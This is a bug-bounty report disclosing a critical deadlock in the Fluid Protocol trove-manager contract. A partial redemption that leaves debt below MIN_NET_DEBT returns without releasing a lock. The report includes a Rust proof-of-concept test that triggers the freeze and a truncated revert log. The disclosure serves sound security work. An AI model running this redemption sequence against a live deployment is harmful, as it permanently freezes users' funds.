# #37323 \[SC-Critical] Permanent dead Lock in internal\_redeem\_collateral\_from\_trove

**Submitted on Dec 2nd 2024 at 08:51:54 UTC by @Catchme for** [**IOP | Fluid Protocol**](https://immunefi.com/audit-competition/iop-fluid-protocol)

* **Report ID:** #37323
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/Hydrogen-Labs/fluid-protocol/tree/main/contracts/trove-manager-contract/src/main.sw>
* **Impacts:**
  * Permanent freezing of funds
  * Permanent freezing of unclaimed yield
  * Smart contract unable to operate due to lack of token funds
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The lock in `internal_redeem_collateral_from_trove` is not released, causing a deadlock.

## Vulnerability Details

in the function `internal_redeem_collateral_from_trove` When new\_debt < MIN\_NET\_DEBT, the lock in `internal_redeem_collateral_from_trove` is not released, causing a deadlock.

```
// contracts/trove-manager-contract/src/main.sw
...

#[storage(read, write)]
fn internal_redeem_collateral_from_trove(
...
    // If the trove's debt is fully redeemed, close the trove
    if (new_debt == 0) {
        internal_remove_stake(borrower);
        internal_close_trove(borrower, Status::ClosedByRedemption);
        internal_redeem_close_trove(borrower, 0, new_coll);
    } else {
        // Calculate the new nominal collateralization ratio
        let new_nicr = fm_compute_nominal_cr(new_coll, new_debt);
        // If the new debt is below the minimum allowed, cancel the partial redemption
        
        ///////////////////////////////////////////////////////////
        ///////////////////////////////////////////////////////////
        ///////////////////////////////////////////////////////////
        if (new_debt < MIN_NET_DEBT) {
            single_redemption_values.cancelled_partial = true;  
            return single_redemption_values;                   
            // VULN : The `lock_internal_redeem_collateral_from_trove` is not released. 
            
        }
        ///////////////////////////////////////////////////////////
        ///////////////////////////////////////////////////////////
        ///////////////////////////////////////////////////////////
        
        // Re-insert the trove into the sorted list with its new NICR
...
}
```

## Impact Details

This vulnerability can cause a deadlock in the contract permanently

## References

<https://github.com/Hydrogen-Labs/fluid-protocol/blob/main/contracts/trove-manager-contract/src/main.sw#L819>

## Proof of Concept

## Proof of Concept

```
use fuels::{prelude::*, types::Identity};
use test_utils::data_structures::{ContractInstance, PRECISION};
use test_utils::interfaces::oracle::oracle_abi;
use test_utils::interfaces::protocol_manager::ProtocolManager;
use test_utils::interfaces::pyth_oracle::PYTH_TIMESTAMP;
use test_utils::utils::print_response;
use test_utils::{
    interfaces::{
        active_pool::active_pool_abi,
        borrow_operations::{borrow_operations_abi, BorrowOperations},
        coll_surplus_pool::coll_surplus_pool_abi,
        protocol_manager::protocol_manager_abi,
        pyth_oracle::{pyth_oracle_abi, pyth_price_feed},
        token::token_abi,
        trove_manager::{trove_manager_abi, trove_manager_utils, Status},
    },
    setup::common::setup_protocol,
    utils::with_min_borrow_fee,
};

#[tokio::test]
async fn test_dead_lock() {
    let (contracts, _admin, mut wallets) = setup_protocol(5, true, false).await;

    let healthy_wallet1 = wallets.pop().unwrap();

    let balance: u64 = 12_000 * PRECISION;

    token_abi::mint_to_id(
        &contracts.asset_contracts[0].asset,
        balance,
        Identity::Address(healthy_wallet1.address().into()),
    )
    .await;

    let borrow_operations_healthy_wallet1 = ContractInstance::new(
        BorrowOperations::new(
            contracts.borrow_operations.contract.contract_id().clone(),
            healthy_wallet1.clone(),
        ),
        contracts.borrow_operations.implementation_id.clone(),
    );

    let coll1 = 6000 * PRECISION;
    let debt1 = 2000 * PRECISION;

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[0].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[0].mock_pyth_oracle,
        pyth_price_feed(1),
    )
    .await;

    borrow_operations_abi::open_trove(
        &borrow_operations_healthy_wallet1,
        &contracts.asset_contracts[0].oracle,
        &contracts.asset_contracts[0].mock_pyth_oracle,
        &contracts.asset_contracts[0].mock_redstone_oracle,
        &contracts.asset_contracts[0].asset,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.sorted_troves,
        &contracts.asset_contracts[0].trove_manager,
        &contracts.active_pool,
        coll1,
        debt1,
        Identity::Address(Address::zeroed()),
        Identity::Address(Address::zeroed()),
    )
    .await
    .unwrap();

    //------------------------------------------------
    // Here is the PoC
    // Firstly wallet1 opens a trove with 6000 collateral and 2000 debt
    // Then wallet1 tries to redeem 1600 collateral
    // During the redemption in contract `trove-manager-contract`'s funciton `internal_redeem_collateral_from_trove`
    // The new debt is 2000 - 1600 = 400 < MIN_NET_DEBT 
    //------------------------------------------------


    let redemption_amount: u64 = 1600 * PRECISION;

    let protocol_manager_health1 = ContractInstance::new(
        ProtocolManager::new(
            contracts.protocol_manager.contract.contract_id().clone(),
            healthy_wallet1.clone(),
        ),
        contracts.protocol_manager.implementation_id,
    );

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[1].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[1].mock_pyth_oracle,
        pyth_price_feed(1),
    )
    .await;

    protocol_manager_abi::redeem_collateral(
        &protocol_manager_health1,
        redemption_amount,
        10,
        0,  
        None,
        None,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.coll_surplus_pool,
        &contracts.default_pool,
        &contracts.active_pool,
        &contracts.sorted_troves,
        &contracts.asset_contracts,
    )
    .await;

    dbg!("Redeem collateral finished");

    // This will cause dead lock, and the transaction will be reverted

    protocol_manager_abi::redeem_collateral(
        &protocol_manager_health1,
        20,
        10,
        0,
        None,
        None,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.coll_surplus_pool,
        &contracts.default_pool,
        &contracts.active_pool,
        &contracts.sorted_troves,
        &contracts.asset_contracts,
    )
    .await;

}
```

## output log

```running
test test_dead_lock ... FAILED

successes:

successes:

failures:

---- test_dead_lock stdout ----
Deploying core contracts...
Initializing core contracts...
[contracts/protocol-manager-contract/tests/success_redemptions.rs:116:5] "Redeem collateral finished" = "Redeem collateral finished"
thread 'test_dead_lock' panicked at /home/upon/Documents/work/fluid-protocol/test-utils/src/interfaces/protocol_manager.rs:214:14:
called `Result::unwrap()` on an `Err` value: Transaction(Reverted { reason: "AsciiString { data: \"TroveManager: Internal redeem collateral from trove is locked\" }", revert_id: 18446744073709486080, receipts: [Call { id: 0000000000000000000000000000000000000000000000000000000000000000, 
```
